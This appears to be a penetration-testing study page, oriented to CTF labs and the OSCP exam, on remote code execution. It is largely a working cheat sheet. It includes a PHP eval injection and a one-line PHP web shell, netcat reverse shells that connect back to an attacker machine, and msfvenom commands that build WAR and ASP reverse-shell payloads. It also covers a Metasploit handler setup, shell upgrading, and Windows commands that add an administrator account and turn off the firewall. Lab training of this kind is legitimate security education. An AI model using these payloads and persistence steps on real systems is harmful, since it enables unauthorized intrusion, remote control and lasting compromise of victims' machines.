# Remote code execution

## Remote code execution

Remote code execution (RCE), also known as code injection, refers to an attacker executing commands on a system from a remote machine. Often this means exploiting a web application/server to run commands for the underlying operating system.

### Basic technique <a href="#basic-technique" id="basic-technique"></a>

The following php snippet will take the `GET` parameter `code` and run it through the `eval()` function without any input sanitization:

Copy

```
<?php $code = $_GET['code'];
eval($code); ?>
```

The `eval()` function evaluates the contents as php code, which means we can provide any php code as an argument. The code injection would look like this:

Copy

```
http://[host]/page.php?code=phpinfo();
```

### Remote command execution <a href="#remote-command-execution" id="remote-command-execution"></a>

You might also be able to execute single-line system commands like `system('id');`. For multi-line system commands, use `shell_exec`:

Copy

```
http://[host]/page.php?code=echo shell_exec('/sbin/ifconfig eth0');
```

This method is useful for both system enumeration and shell injection. Make sure to use absolute paths for calling system files, or the web application may not find them.

### Shells <a href="#shells" id="shells"></a>

For most lab or CTF environments, the goal is to get some kind of command shell on the machine for further exploitation. Sometimes this simply means discovering SSH or remote desktop credentials and logging in. Other times, it's exploiting a web application to generate a reverse shell that connects to your attack machine and waits for instructions.

In real life I'm not sure how often reverse shells really happen, but they're fun to pull off in the lab.

If shells are a new concept, [this is a good primer](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/).

#### Listeners <a href="#listeners" id="listeners"></a>

Your attack machine needs to have a listener running to catch a reverse shell connection. Make sure you specify the IP address of your attack machine and use a port that doesn't already have a service listening. If you need to use `python SimpleHTTPServer` or similar to transfer exploits, make sure that isn't running on the same port.

**Netcat listener**

Using ports 80 or 443 will help you get around egress filtering:

Copy

```
nc -nlvp 443
```

**Meterpreter listener**

You may prefer a Meterpreter listener if you're connecting to a Windows machine and want to take advantage of commands like `getsystem`, or you want to use local Metasploit exploits once you've connected to the remote machine.

Avoid using port 4444 since that is widely recognized as a Metasploit port:

Copy

```
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp # or whatever
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost [attack machine] # your IP address
lhost => [attack machine]
msf exploit(handler) > set lport 443
lport => 443
msf exploit(handler) > run
```

#### Simple PHP web shell <a href="#simple-php-web-shell" id="simple-php-web-shell"></a>

Assuming you are able to put a file on the web server or edit an existing one (e.g. CMS template) this is the simplest type of shell:

Copy

```
<?php echo shell_exec($_GET['cmd']); ?>
```

You can use it for system commands:

Copy

```
http://[host]/wordpress/index.php?cmd=id
```

You can also use it to create a reverse shell:

Copy

```
http://[host]/wordpress/?cmd=nc [attack machine] [port] -e /bin/sh
```

#### PHP shell <a href="#php-shell" id="php-shell"></a>

This [PHP web shell from pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) is nice. Make sure to change the following variables before uploading:

Copy

```
$ip = '127.0.0.1';  # change to attack machine IP
$port = 1234;       # change to attack machine port
```

#### Perl shell <a href="#perl-shell" id="perl-shell"></a>

As with the PHP shell, change the following variables in your [Perl shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell):

Copy

```
my $ip = '127.0.0.1';
my $port = 1234;
```

I rarely use Perl shells. One time, I tried to call a Perl reverse shell in the filesystem using this [web server exploit](https://www.exploit-db.com/exploits/2017). The reverse shell didn't fire with a `.pl` extension, but worked fine when I used a `.cgi` extension. Setting correct permissions using `chmod 755 [file]` may have also helped.

#### WAR shell <a href="#war-shell" id="war-shell"></a>

If you're able to access a Tomcat server's management interface, you can generate and upload a WAR file:

Copy

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[attack machine] LPORT=443 -f war > shell.war
```

You can fire the shell by clicking on the link in Tomcat's management interface, or by going to the appropriate URL (e.g. `http://[host]/shell/`)

#### ASP shell <a href="#asp-shell" id="asp-shell"></a>

Meterpreter is good for catching Windows shells, but it's good to practice doing them manually (e.g. because OSCP restricts Metasploit use). You can use `msfvenom` to generate a non-staged payload that can be caught by a netcat listener:

Copy

```
msfvenom -p windows/shell_reverse_tcp LHOST=[attack machine] LPORT=445 -f asp > shell.asp
```

A non-staged payload is sent in one hit, which is why it can be caught by a netcat listener. A staged payload is sent in small pieces, which is why Metasploit needs to be used.

To create a staged payload and catch the shell using Metasploit's `/exploit/multi/handler`:

Copy

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[attack machine] LPORT=445 -f asp > shell.asp
```

Apparently `/exploit/multi/handler` is allowed on the OSCP exam, but this isn't much of an advantage if you can't use Meterpreter or Metasploit's local exploits. But if you don't have a lot of space for the payload, staging it is an option.

### Upgrading shell <a href="#upgrading-shell" id="upgrading-shell"></a>

You will use this line pretty often to fix your shells:

Copy

```
python -c 'import pty; pty.spawn("/bin/bash");'
```

To improve the shell further, use `Ctrl + Z` to background the reverse shell, then in your local machine run:

Copy

```
stty raw -echo
fg
```

Then type `reset` and hit `Enter`for a fully interactive reverse shell.

If the shell dimensions are wrong, background the reverse shell again with `Ctrl + Z`, go to your local machine and run:

Copy

```
stty size
```

This should return two numbers, which are the number of rows and columns in your terminal. Assuming these numbers are `48 120`, return to your victim machine’s shell and run:

Copy

```
stty -rows 48 -columns 120
```

### Windows <a href="#windows" id="windows"></a>

Windows is a little weird. If you encounter an IIS server, you can use msfvenom to create an `.asp` or `.aspx` payload, as described above. You can also attempt to upload nc.exe (remember to set `binary` mode if you use ftp), then run:

Copy

```
nc.exe -e cmd.exe [attack machine] [port]
```

You can [download nc.exe from here](https://eternallybored.org/misc/netcat/).

If RDP is enabled (port 3389), you might be able to create a user and add them to the “Remote Desktop Users” group, then log in via remote desktop.

Add a user on Windows:

Copy

```
net user $username $password /add
```

Add a user to the “Remote Desktop Users” group:

Copy

```
net localgroup "Remote Desktop Users" $username /add
```

Make a user an Administrator:

Copy

```
net localgroup administrators $username /add
```

Disable Windows firewall on newer versions:

Copy

```
NetSh Advfirewall set allprofiles state off
```

Disable windows firewall on older windows:

Copy

```
netsh firewall set opmode disable
```

### Further reading <a href="#further-reading" id="further-reading"></a>

* [Reverse shell cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [Creating Metasploit payloads](https://netsec.ws/?p=331)
* [A guide to hacking without Metasploit](https://medium.com/@hakluke/haklukes-guide-to-hacking-without-metasploit-1bbbe3d14f90)
